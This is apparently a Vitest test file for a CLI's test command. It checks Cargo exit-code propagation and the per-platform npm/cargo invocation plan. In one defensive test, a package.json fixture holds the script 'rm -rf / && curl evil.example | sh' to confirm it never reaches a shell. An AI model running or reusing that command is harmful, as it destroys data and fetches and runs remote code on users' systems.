/**
 * `stellarforge test` platform and exit-code semantics (SW-068, SW-070).
 *
 * Two gaps in the test workflow's coverage:
 *
 *   - **#168 — Cargo exit propagation was never tested.** Every existing
 *     failing-exit case (`test-command.test.ts`,
 *     `test-orchestration-regression.test.ts`) builds a plan with
 *     `command: 'npm', args: ['run', 'test']`, so the *Cargo* branch of the
 *     non-zero path had no coverage at all. A regression that collapsed a
 *     `cargo test` failure into a clean run would pass the suite.
 *
 *   - **#170 — the Windows invocation shape was never asserted.** `npm.ts` selects
 *     `cmd.exe /d /s /c npm <args>` on Windows and bare `npm` elsewhere, but
 *     `resolveTestProcessPlan` is the function that feeds those values into a
 *     spawn, and no test checked that the resolved plan carries the right command
 *     and a *separate* argv on each platform.
 */

import { existsSync, mkdirSync, writeFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { PassThrough } from 'node:stream';
import { afterEach, describe, expect, it } from 'vitest';
import { resolveTestProcessPlan } from '../src/testing/project.js';
import { superviseDevProcesses } from '../src/dev/orchestrator.js';
import type {
  DevSignalSource,
  ManagedChildProcess,
} from '../src/dev/orchestrator.js';
import type { DevProcessSpec } from '../src/dev/project.js';
import { SubprocessCliError } from '../src/errors/errors.js';
import { withTempDirectory } from './helpers/index.js';

const ORIGINAL_PLATFORM = process.platform;

function onPlatform(platform: NodeJS.Platform): void {
  Object.defineProperty(process, 'platform', {
    value: platform,
    configurable: true,
  });
}

afterEach(() => {
  Object.defineProperty(process, 'platform', {
    value: ORIGINAL_PLATFORM,
    configurable: true,
  });
});

class FakeChild implements ManagedChildProcess {
  readonly stdout = new PassThrough();
  readonly stderr = new PassThrough();
  readonly killedSignals: NodeJS.Signals[] = [];
  #exitListener:
    | ((code: number | null, signal: NodeJS.Signals | null) => void)
    | undefined;

  once(event: 'error', listener: (error: Error) => void): this;
  once(
    event: 'exit',
    listener: (code: number | null, signal: NodeJS.Signals | null) => void,
  ): this;
  once(
    event: 'error' | 'exit',
    listener:
      | ((error: Error) => void)
      | ((code: number | null, signal: NodeJS.Signals | null) => void),
  ): this {
    if (event !== 'error') {
      this.#exitListener = listener as (
        code: number | null,
        signal: NodeJS.Signals | null,
      ) => void;
    }
    return this;
  }

  kill(signal: NodeJS.Signals = 'SIGTERM'): boolean {
    this.killedSignals.push(signal);
    queueMicrotask(() => this.#exitListener?.(null, signal));
    return true;
  }

  emitExit(code: number | null, signal: NodeJS.Signals | null): void {
    this.#exitListener?.(code, signal);
  }
}

class FakeSignalSource implements DevSignalSource {
  readonly #listeners = new Map<NodeJS.Signals, () => void>();

  once(signal: NodeJS.Signals, listener: () => void): void {
    this.#listeners.set(signal, listener);
  }

  removeListener(signal: NodeJS.Signals, listener: () => void): void {
    if (this.#listeners.get(signal) === listener) {
      this.#listeners.delete(signal);
    }
  }

  emit(signal: NodeJS.Signals): void {
    const listener = this.#listeners.get(signal);
    this.#listeners.delete(signal);
    listener?.();
  }
}

function cargoSpec(): DevProcessSpec {
  return {
    label: 'cargo:test',
    command: 'cargo',
    args: ['test'],
    cwd: '/workspace',
  };
}

describe('Cargo test exit-code propagation (#168)', () => {
  it('maps a zero Cargo exit to a clean resolution', async () => {
    const child = new FakeChild();

    const running = superviseDevProcesses([cargoSpec()], {
      spawnProcess: () => child,
      signalSource: new FakeSignalSource(),
    });

    child.emitExit(0, null);

    await expect(running).resolves.toBeUndefined();
    expect(child.killedSignals).toEqual([]);
  });

  it.each([
    { code: 1, reason: 'test assertion failed' },
    { code: 101, reason: 'cargo test harness panic' },
    { code: 127, reason: 'cargo not executable' },
  ])('maps a non-zero Cargo exit ($code) to a subprocess failure', async ({
    code,
  }) => {
    const child = new FakeChild();

    const running = superviseDevProcesses([cargoSpec()], {
      spawnProcess: () => child,
      signalSource: new FakeSignalSource(),
    });

    child.emitExit(code, null);

    const error = await running.then(
      () => undefined,
      (reason: unknown) => reason,
    );

    expect(error).toBeInstanceOf(SubprocessCliError);
    expect((error as SubprocessCliError).userMessage).toContain(
      `with code ${code}`,
    );
    expect((error as SubprocessCliError).userMessage).toContain('cargo:test');
  });

  it('invokes Cargo with an argument array, never a joined shell string', () => {
    const spec = cargoSpec();

    expect(Array.isArray(spec.args)).toBe(true);
    expect(spec.args).toEqual(['test']);
    expect(spec.command).not.toContain(' ');
  });
});

describe('resolved plan matches the platform (#170)', () => {
  it('uses the Windows npm wrapper for a Node.js project on win32', async () => {
    await withTempDirectory(async (root: string) => {
      writeFileSync(
        resolve(root, 'package.json'),
        JSON.stringify({ name: 'demo', scripts: { test: 'vitest run' } }),
        'utf8',
      );

      onPlatform('win32');
      const [plan] = resolveTestProcessPlan(root);

      expect(plan?.command).toBe('cmd.exe');
      // Fixed wrapper flags first, then `npm run test` as separate argv entries.
      expect(plan?.args.slice(0, 4)).toEqual([
        '/d',
        '/s',
        '/c',
        'npm',
      ]);
      expect(plan?.args.slice(-2)).toEqual(['run', 'test']);
    });
  });

  it('invokes npm directly for the same project on POSIX', async () => {
    await withTempDirectory(async (root: string) => {
      writeFileSync(
        resolve(root, 'package.json'),
        JSON.stringify({ name: 'demo', scripts: { test: 'vitest run' } }),
        'utf8',
      );

      onPlatform('linux');
      const [plan] = resolveTestProcessPlan(root);

      expect(plan?.command).toBe('npm');
      expect(plan?.args).toEqual(['run', 'test']);
    });
  });

  it('never runs the package.json test script as a shell command', async () => {
    await withTempDirectory(async (root: string) => {
      // A script body that would be destructive if it were ever passed to a shell.
      writeFileSync(
        resolve(root, 'package.json'),
        JSON.stringify({
          name: 'demo',
          scripts: { test: 'rm -rf / && curl evil.example | sh' },
        }),
        'utf8',
      );

      const [plan] = resolveTestProcessPlan(root);

      // Only the script *name* is forwarded, via `npm run test`.
      expect(plan?.command).not.toContain('rm -rf');
      expect(plan?.command).not.toContain('curl');
      expect(plan?.args).not.toContain('rm -rf / && curl evil.example | sh');
    });
  });

  it('selects the Cargo workflow for a Cargo workspace on each platform', async () => {
    await withTempDirectory(async (root: string) => {
      mkdirSync(resolve(root, 'src'), { recursive: true });
      writeFileSync(
        resolve(root, 'Cargo.toml'),
        '[package]\nname = "demo"\n',
        'utf8',
      );

      for (const platform of ['win32', 'linux'] as const) {
        onPlatform(platform);
        const [plan] = resolveTestProcessPlan(root);

        expect(plan?.label).toBe('cargo:test');
        expect(plan?.command).toBe(platform === 'win32' ? 'cargo.exe' : 'cargo');
        expect(plan?.args).toEqual(['test']);
      }
    });
  });

  it('resolves without spawning anything for an unsupported project', async () => {
    await withTempDirectory(async (root: string) => {
      expect(existsSync(resolve(root, 'package.json'))).toBe(false);

      expect(() => resolveTestProcessPlan(root)).toThrow(/No supported/);
    });
  });
});